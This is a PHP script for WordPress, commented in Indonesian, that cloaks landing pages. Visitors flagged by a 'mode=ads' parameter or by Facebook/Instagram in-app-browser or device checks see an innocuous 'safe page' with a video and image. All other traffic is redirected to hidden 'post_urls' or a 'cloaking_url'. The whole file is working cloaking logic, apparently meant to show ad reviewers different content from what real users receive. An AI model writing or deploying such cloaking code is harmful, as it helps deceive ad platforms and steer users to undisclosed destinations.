<?php

/**
 * ===================================================================
 * HELPER FUNCTIONS (FUNGSI BANTU)
 * ===================================================================
 */

/**
 * Mendeteksi apakah User Agent berasal dari browser internal Facebook/Instagram.
 * @return bool True jika dari FB/IG, false jika bukan.
 */
function is_fb_or_ig_browser()
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    return (strpos($user_agent, "FBAV") !== false) || (strpos($user_agent, "FBAN") !== false) || (strpos($user_agent, "Instagram") !== false);
}

/**
 * Mendeteksi apakah User Agent berasal dari perangkat mobile.
 * @return bool True jika mobile, false jika bukan (dianggap desktop).
 */
function is_mobile_device()
{
    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    return preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|rim)|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i', $user_agent) || preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|4t|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr($user_agent, 0, 4));
}

/**
 * ===================================================================
 * SCRIPT UTAMA
 * ===================================================================
 */

// LANGKAH 1: Memuat inti WordPress.
require_once('wp-load.php'); // Memuat WordPress
// LANGKAH 2: Ambil parameter & data dari DB.
$slug = $_GET['slug'] ?? null;
$mode = $_GET['mode'] ?? null;

if (!$slug) {
    http_response_code(400);
    echo "Error: Parameter 'slug' wajib diisi.";
    exit;
}

global $wpdb;
$table_name = $wpdb->prefix . 'acp_landings';
$query = $wpdb->prepare("SELECT * FROM $table_name WHERE slug = %s", $slug);
$templateData = $wpdb->get_row($query, ARRAY_A);

// LANGKAH 3: Validasi data awal.
if (!$templateData || $templateData['status'] == 0) {
    $fallback_url = $templateData['cloaking_url'] ?? 'https://www.youtube.com/watch?v=rMtqRp4hUYc&list=RDrMtqRp4hUYc&start_radio=1';
    wp_redirect($fallback_url);
    exit;
}

// LANGKAH 4: LOGIKA BARU UNTUK MENENTUKAN OUTPUT
$showSafePage = false; // Defaultnya, semua traffic dianggap biasa (akan di-redirect)

// Cek 1: Apakah ada parameter 'mode=ads'? (Prioritas tertinggi)
if ($mode === 'ads') {
    $showSafePage = true;
}
// Cek 2: Jika bukan 'mode=ads', cek aturan perangkat.
elseif ($mode !== 'public') {
    $device_rule = $templateData['device_view'];
    switch ($device_rule) {
        case 'fb_browser':
            if (is_fb_or_ig_browser()) $showSafePage = true;
            break;
        case 'ponsel':
            if (is_mobile_device()) $showSafePage = true;
            break;
        case 'desktop':
            if (!is_mobile_device()) $showSafePage = true;
            break;
    }
}

// LANGKAH 5: Tampilkan output berdasarkan hasil akhir
$cloaking_url = $templateData['cloaking_url'];
$post_urls = preg_split("/\r\n|\n|\r/", $templateData['post_urls']);

if ($showSafePage) {
    // Tampilkan halaman "aman" (safe page)
    $video_urls = json_decode($templateData['video_urls'], true);
    $img_urls = json_decode($templateData['universal_image_urls'], true);

    // [LOGIKA BARU] Ambil dan proses nilai timer dari database
    $pause_range_str = $templateData['timer_auto_pause_video'] ?? '';
    $refresh_timer_sec = (int)($templateData['timer_auto_refresh'] ?? 0);

    $random_pause_time_ms = 0;
    // Cek jika formatnya 'angka-angka'
    if (preg_match('/^(\d+)-(\d+)$/', $pause_range_str, $matches)) {
        $min_sec = (int)$matches[1];
        $max_sec = (int)$matches[2];
        // Pastikan min lebih kecil dari max
        if ($min_sec < $max_sec) {
            // Hitung waktu pause acak dalam milidetik
            $random_pause_time_ms = rand($min_sec * 1000, $max_sec * 1000);
        }
    }

    header("Content-Type: text/html; charset=UTF-8");
    echo "<!DOCTYPE html><html><head><title>" . esc_html($templateData['title']) . "</title></head><body style='text-align:center;padding:20px;'>";
    echo "<h2>" . esc_html($templateData['title']) . "</h2>";

    if (!empty($video_urls[0])) {
        // Tambahkan ID pada tag video agar bisa ditarget oleh JavaScript
        echo "<video id='safe-page-video' width='640' controls autoplay muted loop playsinline>
              <source src='" . esc_url($video_urls[0]) . "' type='video/webm'>
              Browser tidak support video.
            </video><br><br>";
    }

    if (!empty($img_urls[0])) {
        echo "<img src='" . esc_url($img_urls[0]) . "' alt='Gambar' width='640'><br>";
    }

    // [LOGIKA BARU] Tambahkan script timer jika ada nilai yang valid
    if ($random_pause_time_ms > 0 || $refresh_timer_sec > 0) {
        echo "<script>
            document.addEventListener('DOMContentLoaded', function() {
                const video = document.getElementById('safe-page-video');
                // Logika Auto Pause Video
                const pauseTimeInMs = " . $random_pause_time_ms . ";
                if (video && pauseTimeInMs > 0) {
                    setTimeout(function() {
                        video.pause();
                    }, pauseTimeInMs);
                }

                // Logika Auto Refresh Halaman
                const refreshTimeInMs = " . ($refresh_timer_sec * 1000) . ";
                if (refreshTimeInMs > 0) {
                    setTimeout(function() {
                        location.reload();
                    }, refreshTimeInMs);
                }
            });
        </script>";
    }

    echo "</body></html>";
} else {
    // Redirect ke URL cloaking/post untuk traffic biasa
    if (!empty($post_urls) && !empty(trim($post_urls[0]))) {
        $redirectTo = $post_urls[array_rand($post_urls)];
        wp_redirect(trim($redirectTo));
    } else {
        wp_redirect($cloaking_url);
    }
}

exit;
